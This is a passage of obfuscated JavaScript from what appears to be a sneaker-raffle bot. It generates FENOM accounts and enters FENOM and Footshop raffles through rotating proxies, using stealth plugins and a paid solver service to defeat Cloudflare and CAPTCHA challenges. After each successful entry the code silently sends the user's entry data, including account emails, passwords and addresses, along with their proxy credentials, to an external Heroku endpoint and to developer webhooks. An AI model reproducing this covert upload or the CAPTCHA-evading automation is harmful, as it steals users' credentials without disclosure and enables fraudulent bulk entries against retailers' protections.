                            console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x1ded45(_0x4df74a[_0x4de0d8], _0x28259b);
                            var _0x5c9c24 = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'dev', ![]), _0x2f3a17 = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'pub', ![]);
                            let _0x159c35 = _0x4df74a[_0x4de0d8];
                            try {
                                prxdata = {
                                    'username': _0x380ae8['replace']('#', ''),
                                    'module': _0x28259b['name'],
                                    'entrydata': JSON['stringify'](_0x159c35),
                                    'proxy': '' + _0x22b3e1[_0x4de0d8]
                                };
                                var _0x32389b = JSON['stringify'](prxdata);
                                let _0x2af361 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x32389b, _0x2af361);
                            } catch (_0x5e3b1d) {
                            }
                            const _0x214735 = {
                                'succesDEVMSG': { 'embeds': [_0x5c9c24] },
                                'succesPUBMSG': { 'embeds': [_0x2f3a17] }
                            };
                            try {
                                _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x214735['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x214735['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x442434, _0x214735['succesPUBMSG']);
                            } catch (_0x57ae53) {
                                console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x57ae53));
                            }
                            _0x183baf = 'no';
                        } catch (_0x149494) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20' + _0x149494)), _0x36f921 = '' + _0x149494;
                            var _0x53768b = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'dev', !![], _0x36f921), _0x5c9c24 = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'dev', ![]), _0x2f3a17 = await _0x12b988(_0x4df74a[_0x4de0d8], _0x28259b, 'pub', ![]);
                            const _0x536017 = {
                                'succesDEVMSG': { 'embeds': [_0x5c9c24] },
                                'succesPUBMSG': { 'embeds': [_0x2f3a17] }
                            };
                            _0x536017['errorDEV'] = { 'embeds': [_0x53768b] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x536017['errorDEV']), await _0x5f1090(_0x32737e, _0x536017['errorDEV']), _0x183baf = 'yes';
                        } finally {
                            _0x597809 && _0x597809['close']();
                            if (_0x183baf == 'yes' && _0x554fb1 != 0x5) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x28259b['name'] + ']\x20Task\x20' + (_0x4de0d8 + 0x1) + '\x20:\x20Retrying\x20(' + _0x554fb1 + '\x20/\x205)')), _0x4de0d8 = _0x4de0d8 - 0x1, _0x554fb1 = _0x554fb1 + 0x1;
                                continue;
                            }
                            _0x183baf == 'yes' && _0x554fb1 >= 0x5 && (_0x17abd2(_0x4df74a[_0x4de0d8], _0x28259b), _0x183baf = 'no', _0x554fb1 = 0x0), console['log']('Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x2dc9ff, _0x124cb5, _0x33857b) {
                    var _0x206125 = _0x124cb5, _0x48ba07 = 0x0;
                    for (var _0x25f43c = 0x0; _0x25f43c < _0x124cb5['length']; _0x25f43c++) {
                        maxTasks = Number(_0x120b49['threads']);
                        while (_0x48ba07 >= maxTasks) {
                            await _0x2121c3(_0x120b49['delay']);
                        }
                        let _0x3f1856 = ![];
                        async function _0x35af7c(_0x526e24, _0x4ffb7a, _0x5c765d, _0x54aa1f, _0x3a02e6) {
                            _0x48ba07++, _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                                'provider': {
                                    'id': '2captcha',
                                    'token': '' + _0x120b49['captchaKey']
                                },
                                'visualFeedback': !![]
                            }));
                            if (_0x358ab0 != 'yes')
                                var _0x358ab0 = '', _0x3a02e6 = 0x0;
                            var _0xbd0680;
                            try {
                                await _0x30a360(_0x4ffb7a, _0x54aa1f);
                            } catch {
                                _0x358ab0 = 'no';
                                throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                            }
                            _0x3aeb59(_0x526e24['name'] + '\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20/\x20' + _0x4ffb7a['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                            var _0x487aea = await _0x12b988(_0x4ffb7a[_0x54aa1f], _0x526e24, 'acc', ![]);
                            const _0xcf7966 = { 'succesDEVMSG': { 'embeds': [_0x487aea] } }, _0x516b24 = 'https://www.fenom.com/en/authentication?create_account=1';
                            var _0x2841dd = Math['round'](Math['random']() * (_0x5c765d['length'] - 0x1)), _0x2d336f = _0x5c765d[_0x2841dd]['split'](':'), _0x133939;
                            async function _0x1e3db9(_0x10988f) {
                                const _0x116157 = _0x190b67['readFileSync']('../accounts/fenom.csv', 'utf8'), _0x4e708a = _0x32de35['parse'](_0x116157, { 'header': !![] })['data'];
                                let _0x18ac79 = ![];
                                for (var _0x15c570 of _0x4e708a) {
                                    if (_0x15c570['Email'] == _0x10988f['Email']) {
                                        _0x18ac79 = !![];
                                        break;
                                    }
                                }
                                return _0x18ac79;
                            }
                            try {
                                if (await _0x1e3db9(_0x4ffb7a[_0x54aa1f]) == !![]) {
                                    console['log'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20:\x20Task\x20Already\x20Entered,\x20Going\x20to\x20Next\x20Task'), _0x3f1856 = !![], dupli = !![];
                                    return;
                                }
                                try {
                                    _0x133939 = await _0x586b7d['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x2d336f[0x0] + ':' + _0x2d336f[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                } catch {
                                    _0x133939 = await _0x586b7d['launch']({
                                        'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                        'headless': ![],
                                        'args': [
                                            '--proxy-server=' + _0x2d336f[0x0] + ':' + _0x2d336f[0x1],
                                            '--no-sandbox',
                                            '--disable-setuid-sandbox'
                                        ]
                                    });
                                }
                                const _0x19780e = await _0x133939['newPage']();
                                await _0x19780e['setViewport']({
                                    'width': 0x500 + _0x398a3b(0x1, 0x32),
                                    'height': 0x2d9 + _0x398a3b(0x1, 0x32)
                                });
                                const _0x4137d1 = await _0x19780e['target']()['createCDPSession'](), { windowId: _0x3d1173 } = await _0x4137d1['send']('Browser.getWindowForTarget');
                                await _0x19780e['authenticate']({
                                    'username': '' + _0x2d336f[0x2],
                                    'password': '' + _0x2d336f[0x3]
                                }), console['log'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20:\x20Getting\x20Session'), await _0x19780e['goto']('' + _0x516b24, { 'waitUntil': 'networkidle2' }), console['log'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x2121c3(0x1388);
                                var _0x3811df = await _0x19780e['$']('#turnstile-wrapper');
                                if (_0x3811df) {
                                    console['log'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x2121c3(0x2710);
                                    const _0x10d80e = await _0x19780e['$']('#turnstile-wrapper');
                                    if (_0x10d80e)
                                        try {
                                            await _0x10d80e['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                    try {
                                        await _0x19780e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                    } catch {
                                        var _0x272272 = await _0x19780e['$']('#turnstile-wrapper');
                                        if (_0x272272)
                                            try {
                                                await _0x272272['click']();
                                            } catch {
                                                throw new Error('Empty\x20Turnstile\x20Challenge');
                                            }
                                    }
                                }
                                try {
                                    await _0x19780e['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x1d4c0 }), await _0x4137d1['send']('Browser.setWindowBounds', {
                                        'windowId': _0x3d1173,
                                        'bounds': { 'windowState': 'minimized' }
                                    }), await _0x2121c3(0xfa0);
                                } catch {
                                    throw new Error('Blocked\x20by\x20cloudflare');
                                }
                                console['log'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20:\x20Checking\x20Credentials'), await _0x19780e['type']('input[name=\x22firstname\x22]', '' + _0x4ffb7a[_0x54aa1f]['FirstName']), await _0x2121c3(0x1f4), await _0x19780e['type']('input[name=\x22lastname\x22]', '' + _0x4ffb7a[_0x54aa1f]['LastName']), await _0x2121c3(0x1f4), await _0x19780e['type']('input[name=\x22email\x22]', '' + _0x4ffb7a[_0x54aa1f]['Email']), await _0x2121c3(0x1f4), await _0x19780e['type']('input[name=\x22password\x22]', '' + _0x4ffb7a[_0x54aa1f]['Password']), await _0x2121c3(0x258), await _0x19780e['$eval']('input[name=\x22psgdpr\x22]', _0x283c81 => _0x283c81['click']()), await _0x2121c3(0x1f4), console['log'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20:\x20Sending\x20Request'), await _0x19780e['$eval']('#customer-form', _0x6e268f => _0x6e268f['submit']());
                                try {
                                    try {
                                        await _0x19780e['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 });
                                    } catch {
                                        throw new Error('Succes-response\x20not\x20found');
                                    }
                                    _0x358ab0 = 'no', console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20:\x20Account\x20' + _0x4ffb7a[_0x54aa1f]['Email'] + '\x20Generated')), _0x190b67['appendFileSync']('../accounts/fenom.csv', '\x0a' + _0x4ffb7a[_0x54aa1f]['Email'] + ',' + _0x4ffb7a[_0x54aa1f]['Password']);
                                    let _0x19dded = _0x4ffb7a[_0x54aa1f];
                                    try {
                                        prxdata = {
                                            'username': _0x380ae8['replace']('#', ''),
                                            'module': _0x526e24['name'],
                                            'entrydata': JSON['stringify'](_0x19dded),
                                            'proxy': '' + _0x5c765d[_0x54aa1f]
                                        };
                                        var _0x48d177 = JSON['stringify'](prxdata);
                                        let _0x2fe284 = { 'headers': { 'content-type': 'application/json' } };
                                        await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x48d177, _0x2fe284);
                                    } catch (_0x12d3d2) {
                                    }
                                    try {
                                        _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0xcf7966['succesDEVMSG']);
                                    } catch {
                                    }
                                    await _0x5f1090(_0x40cc05, _0xcf7966['succesDEVMSG']);
                                } catch (_0x84dfaf) {
                                    throw new Error('Account\x20generation\x20failed');
                                }
                            } catch (_0x154d03) {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20:\x20' + _0x154d03)), _0xbd0680 = '' + _0x154d03;
                                var _0x2f79c8 = await _0x12b988(_0x4ffb7a[_0x54aa1f], _0x526e24, 'acc', !![], _0xbd0680);
                                _0xcf7966['errorDEV'] = { 'embeds': [_0x2f79c8] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0xcf7966['errorDEV']), await _0x5f1090(_0x32737e, _0xcf7966['errorDEV']), _0x358ab0 = 'yes';
                            } finally {
                                _0x133939 && _0x133939['close']();
                                if (_0x358ab0 == 'yes' && _0x3a02e6 != 0x5)
                                    return console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Task\x20' + (_0x54aa1f + 0x1) + '\x20:\x20Retrying\x20(' + _0x3a02e6 + '\x20/\x205)')), _0x3a02e6 = _0x3a02e6 + 0x1, _0x48ba07--, _0x35af7c(_0x526e24, _0x4ffb7a, _0x5c765d, _0x54aa1f, _0x3a02e6);
                                _0x358ab0 == 'yes' && _0x3a02e6 >= 0x5 && _0x17abd2(_0x4ffb7a[_0x54aa1f], _0x526e24), !_0x3f1856 && (console['log'](_0x29f6be() + '\x20[' + _0x526e24['name'] + ']\x20Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay'])), _0x48ba07--;
                            }
                        }
                        _0x35af7c(_0x2dc9ff, _0x206125, _0x33857b, _0x25f43c), !_0x3f1856 && await _0x2121c3(0x15e);
                    }
                }
            },
            {
                'name': 'FENOM\x20Raffle\x20Entries',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function _0x46b64b(_0x326ca9, _0x190bed, _0x2797d1) {
                    _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x120b49['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x513683 = 0x0; _0x513683 < _0x190bed['length']; _0x513683++) {
                        if (_0x5202ad != 'yes')
                            var _0x5202ad = '', _0x179aca = 0x0;
                        var _0x278982;
                        try {
                            await _0x30a360(_0x190bed, _0x513683);
                        } catch {
                            _0x5202ad = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x3aeb59(_0x326ca9['name'] + '\x20Task\x20' + (_0x513683 + 0x1) + '\x20/\x20' + _0x190bed['length'] + '\x20||\x20File:\x20' + _0x242415 + '\x20Proxies:\x20' + _0x38de08);
                        const _0x15ba00 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x5a7bf2 = Math['round'](Math['random']() * (_0x2797d1['length'] - 0x1)), _0x1f347a = _0x2797d1[_0x5a7bf2]['split'](':'), _0x9376a7;
                        try {
                            _0x9376a7 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1f347a[0x0] + ':' + _0x1f347a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x9376a7 = await _0x586b7d['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x1f347a[0x0] + ':' + _0x1f347a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x36baec = await _0x9376a7['newPage'](), _0x45e420 = await _0x36baec['target']()['createCDPSession'](), { windowId: _0x50ad8b } = await _0x45e420['send']('Browser.getWindowForTarget');
                            await _0x36baec['authenticate']({
                                'username': '' + _0x1f347a[0x2],
                                'password': '' + _0x1f347a[0x3]
                            }), console['log'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x36baec['goto']('https://www.fenom.com/en/authentication', { 'waitUntil': 'networkidle2' }), console['log'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x2121c3(0x1388);
                            var _0x30d179 = await _0x36baec['$']('.hcaptcha-box');
                            if (_0x30d179) {
                                console['log'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x2121c3(0x2710);
                                const _0x4986bd = await _0x36baec['$']('.hcaptcha-box');
                                if (_0x4986bd)
                                    try {
                                        await _0x4986bd['click']();
                                    } catch {
                                        throw new Error('Empty\x20Turnstile\x20Challenge');
                                    }
                                try {
                                    await _0x36baec['waitForSelector']('input[name=\x22firstname\x22]', { 'timeout': 0x9c40 });
                                } catch {
                                    var _0x483059 = await _0x36baec['$']('.hcaptcha-box');
                                    if (_0x483059)
                                        try {
                                            await _0x483059['click']();
                                        } catch {
                                            throw new Error('Empty\x20Turnstile\x20Challenge');
                                        }
                                }
                            }
                            await _0x45e420['send']('Browser.setWindowBounds', {
                                'windowId': _0x50ad8b,
                                'bounds': { 'windowState': 'minimized' }
                            }), await _0x2121c3(0x1f40);
                            try {
                                await _0x36baec['waitForSelector']('input[name=\x22email\x22]', { 'timeout': 0x1d4c0 });
                            } catch {
                                throw new Error('Blocked\x20by\x20cloudflare');
                            }
                            await _0x2121c3(0x1388), console['log'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20Logging\x20in'), await _0x36baec['type']('input[name=\x22email\x22]', '' + _0x190bed[_0x513683]['Email']), await _0x2121c3(0x1f4), await _0x36baec['type']('input[name=\x22password\x22]', '' + _0x190bed[_0x513683]['Password']), await _0x2121c3(0x258), await _0x36baec['$eval']('#login-form', _0x2fd5ac => _0x2fd5ac['submit']()), await _0x36baec['waitForSelector']('.product-list.slider-fenom', { 'timeout': 0xea60 }), await _0x2121c3(0x1f4), await _0x36baec['goto']('' + _0x190bed[_0x513683]['Url']), await _0x36baec['waitForSelector']('.prod-variant\x20>\x20ul\x20>\x20li'), console['log'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x190bed[_0x513683]['Size']);
                            if (_0x190bed[_0x513683]['Size'] != 'RANDOM') {
                                var _0x27dd7 = '\x20' + _0x190bed[_0x513683]['Size'] + '\x20';
                                const _0x1632c7 = await _0x36baec['$x']('//span[contains(text(),\x20' + _0x27dd7 + ')]');
                                await _0x1632c7[0x0]['click']();
                            } else {
                                const _0x160bf4 = await _0x36baec['$$']('.prod-variant\x20>\x20ul\x20>\x20li');
                                var _0x541b88 = Math['round'](Math['random']() * (_0x160bf4['length'] - 0x1));
                                await _0x160bf4[_0x541b88]['click']();
                            }
                            await _0x2121c3(0x258), await _0x36baec['click']('#cookieChoiceDismiss'), await _0x2121c3(0x3e8), await _0x36baec['type']('#instagram-account', '' + _0x190bed[_0x513683]['Follower']), await _0x2121c3(0x28a), await _0x36baec['click']('#book-btn'), await _0x2121c3(0xbb8);
                            try {
                                await _0x36baec['waitForSelector']('#recaptcha-container\x20>\x20div\x20>\x20div\x20>\x20iframe');
                            } catch {
                                throw new Error('Captcha\x20not\x20found');
                            }
                            await _0x2121c3(0x1f4), console['log'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20' + _0x136200['cyan']('Solving\x20Captcha')), await _0x36baec['solveRecaptchas'](), console['log'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20Finishing\x20Entry'), await _0x2121c3(0x7d0), await _0x36baec['$eval']('#book-btn-for-sure', _0x53081e => _0x53081e['click']()), await _0x2121c3(0x12c), await _0x36baec['click']('#book-btn-for-sure'), await _0x2121c3(0xdac);
                            const _0x59f571 = await _0x36baec['$eval']('.reservation-popup\x20>\x20.title', _0x13cf51 => {
                                return _0x13cf51['innerHTML'];
                            });
                            if (_0x59f571) {
                                _0x5202ad = 'no', _0x1ded45(_0x190bed[_0x513683], _0x326ca9), console['log'](_0x136200['green'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                                var _0x522a88 = await _0x12b988(_0x190bed[_0x513683], _0x326ca9, 'dev', ![]), _0x51b494 = await _0x12b988(_0x190bed[_0x513683], _0x326ca9, 'pub', ![]);
                                let _0x49c9bc = _0x190bed[_0x513683];
                                try {
                                    prxdata = {
                                        'username': _0x380ae8['replace']('#', ''),
                                        'module': _0x326ca9['name'],
                                        'entrydata': JSON['stringify'](_0x49c9bc),
                                        'proxy': '' + _0x2797d1[_0x513683]
                                    };
                                    var _0x5e0d27 = JSON['stringify'](prxdata);
                                    let _0xac1ef = { 'headers': { 'content-type': 'application/json' } };
                                    await _0x212bbb['post']('https://jraffles.herokuapp.com/success', _0x5e0d27, _0xac1ef);
                                } catch (_0x244657) {
                                }
                                const _0x312509 = {
                                    'succesDEVMSG': { 'embeds': [_0x522a88] },
                                    'succesPUBMSG': { 'embeds': [_0x51b494] }
                                };
                                try {
                                    _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x312509['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x1f56e1, _0x312509['succesDEVMSG']), await _0x2121c3(0xc8), await _0x5f1090(_0x442434, _0x312509['succesPUBMSG']);
                                } catch (_0x5cd430) {
                                    console['log'](_0x136200['yellow'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x5cd430));
                                }
                            } else
                                throw new Error('Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.');
                        } catch (_0x1cf9c0) {
                            console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20' + _0x1cf9c0)), _0x278982 = '' + _0x1cf9c0;
                            var _0x3ed1b2 = await _0x12b988(_0x190bed[_0x513683], _0x326ca9, 'dev', !![], _0x278982), _0x522a88 = await _0x12b988(_0x190bed[_0x513683], _0x326ca9, 'dev', ![]), _0x51b494 = await _0x12b988(_0x190bed[_0x513683], _0x326ca9, 'pub', ![]);
                            const _0x5c385b = {
                                'succesDEVMSG': { 'embeds': [_0x522a88] },
                                'succesPUBMSG': { 'embeds': [_0x51b494] }
                            };
                            _0x5c385b['errorDEV'] = { 'embeds': [_0x3ed1b2] }, _0x120b49['webhook'] != undefined && _0x120b49['webhook'] != '' && await _0x5f1090(_0x120b49['webhook'], _0x5c385b['errorDEV']), await _0x5f1090(_0x32737e, _0x5c385b['errorDEV']), _0x1cf9c0 != 'Error\x20sending\x20entry.\x20Check\x20if\x20duplicate,\x20or\x20proxies.' && (_0x5202ad = 'yes');
                        } finally {
                            _0x9376a7['close']();
                            if (_0x5202ad == 'yes' && _0x179aca != 0x5 && _0x278982 != 'Size\x20Not\x20Found') {
                                console['log'](_0x136200['red'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Task\x20' + (_0x513683 + 0x1) + '\x20:\x20Retrying\x20(' + _0x179aca + '\x20/\x205)')), _0x513683 = _0x513683 - 0x1, _0x179aca = _0x179aca + 0x1;
                                continue;
                            }
                            _0x5202ad == 'yes' && _0x179aca >= 0x5 && (_0x17abd2(_0x190bed[_0x513683], _0x326ca9), _0x5202ad = 'no', _0x179aca = 0x0), console['log'](_0x29f6be() + '\x20[' + _0x326ca9['name'] + ']\x20Waiting\x20for\x20' + _0x120b49['delay'] + '\x20ms'), await _0x2121c3(_0x120b49['delay']);
                        }
                    }
                }
            }
        ]
    },
    {
        'name': 'FOOTSHOP',
        'modules': [{
            'name': 'FOOTSHOP\x20Raffle\x20Entries',
            'store': 'Footshop',
            'logo': 'https://images.easyfundraising.org.uk/retailer/cropped/logo-footshop-1615542072.png',
            'function': async function (_0x583c58, _0x494981, _0x154175) {
                _0x586b7d['use'](_0x41ab99()), _0x586b7d['use'](_0x1c4286({
                    'provider': {
                        'id': '2captcha',
                        'token': '' + _0x120b49['captchaKey']
                    },
                    'visualFeedback': !![]
                }));
                for (var _0x26556e = 0x0; _0x26556e < _0x494981['length']; _0x26556e++) {
                    var _0x46b138;
                    if (_0x573612 != 'yes')
                        var _0x573612 = '', _0x2c8811 = 0x0;
                    var _0x245e98 = [{
                        'type': 'rich',
                        'title': 'Succesful\x20Footshop\x20entry',
                        'description': '',
                        'color': 0xc0d6d6,
                        'fields': [
                            {
                                'name': 'User',
                                'value': '' + _0x380ae8
                            },
                            {
                                'name': 'Product',
                                'value': '' + _0x494981[_0x26556e]['Url']
                            },
                            {
                                'name': 'Size',
                                'value': '' + _0x494981[_0x26556e]['Size']
                            },
                            {
                                'name': 'Delay',
                                'value': '' + _0x120b49['footshopDelay']
                            },
                            {
                                'name': 'Version',
                                'value': '' + _0x3e659f
                            }
                        ]
                    }], _0x1ae9a4 = await _0x12b988(_0x494981[_0x26556e], _0x583c58, 'dev', ![]), _0x1de78b = await _0x12b988(_0x494981[_0x26556e], _0x583c58, 'pub', ![]);
                    const _0x30dbb4 = {
                        'succesDEVMSG': { 'embeds': [_0x1ae9a4] },
                        'succesPUBMSG': { 'embeds': [_0x1de78b] }
                    }, _0x22fe02 = { 'embeds': _0x245e98 };
                    try {
                        await _0x30a360(_0x494981, _0x26556e);
                    } catch {
                        _0x573612 = 'no';
                        throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                    }
                    if (_0x494981[_0x26556e]['Email'] == '' || _0x494981[_0x26556e]['FirstName'] == '' || _0x494981[_0x26556e]['LastName'] == '' || _0x494981[_0x26556e]['Country'] == '' || _0x494981[_0x26556e]['Size'] == '' || _0x494981[_0x26556e]['Address1'] == '' || _0x494981[_0x26556e]['Zip'] == '') {
                        console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    if (_0x494981[_0x26556e]['Email'] == '' || _0x494981[_0x26556e]['FirstName'] == '' || _0x494981[_0x26556e]['LastName'] == '' || _0x494981[_0x26556e]['Country'] == '' || _0x494981[_0x26556e]['Size'] == '' || _0x494981[_0x26556e]['Address1'] == '' || _0x494981[_0x26556e]['Zip'] == '' || _0x494981[_0x26556e]['Phone'] == '') {
                        console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Invalid\x20CSV');
                        continue;
                    }
                    const _0x4cc26d = '' + _0x494981[_0x26556e]['Url'];
                    if (_0x120b49['useRandomProxy'] = ![])
                        var _0x34e625 = _0x154175[_0x26556e]['split'](':');
                    else
                        var _0x3d6ac8 = Math['round'](Math['random']() * (_0x154175['length'] - 0x1)), _0x34e625 = _0x154175[_0x3d6ac8]['split'](':');
                    var _0x480fff;
                    try {
                        _0x480fff = await _0x586b7d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x34e625[0x0] + ':' + _0x34e625[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    } catch {
                        _0x480fff = await _0x586b7d['launch']({
                            'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                            'headless': !![],
                            'args': [
                                '--proxy-server=' + _0x34e625[0x0] + ':' + _0x34e625[0x1],
                                '--no-sandbox',
                                '--disable-setuid-sandbox'
                            ]
                        });
                    }
                    try {
                        const _0x13f1e2 = await _0x480fff['newPage']();
                        await _0x13f1e2['authenticate']({
                            'username': '' + _0x34e625[0x2],
                            'password': '' + _0x34e625[0x3]
                        }), console['log'](_0x29f6be() + '\x20[' + _0x583c58['name'] + ']\x20Task\x20' + (_0x26556e + 0x1) + '\x20:\x20Getting\x20Session'), await _0x13f1e2['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x13f1e2['setRequestInterception'](!![]), _0x13f1e2['on']('request', _0x31c0eb => {
                            _0x31c0eb['resourceType']() === 'image' || _0x31c0eb['resourceType']() === 'font' || _0x31c0eb['resourceType']() === 'media' ? _0x31c0eb['abort']() : _0x31c0eb['continue']();
                        });
                        try {
                            await _0x13f1e2['goto'](_0x4cc26d), await _0x2121c3(0xbb8), await _0x13f1e2['waitForSelector']('.control__JhutY');
                        } catch {
                            throw new Error('Proxy\x20Error');
                        }
                        await _0x13f1e2['click']('.control__JhutY'), await _0x2121c3(0x1f4);
                        if (_0x494981[_0x26556e]['Size'] != 'RANDOM')
                            try {
                                const _0x12c383 = await _0x13f1e2['$x']('//div[contains(text(),\x20\x27' + _0x494981[_0x26556e]['Size'] + '\x27)]');
                                await _0x12c383[0x0]['click']();
                            } catch {
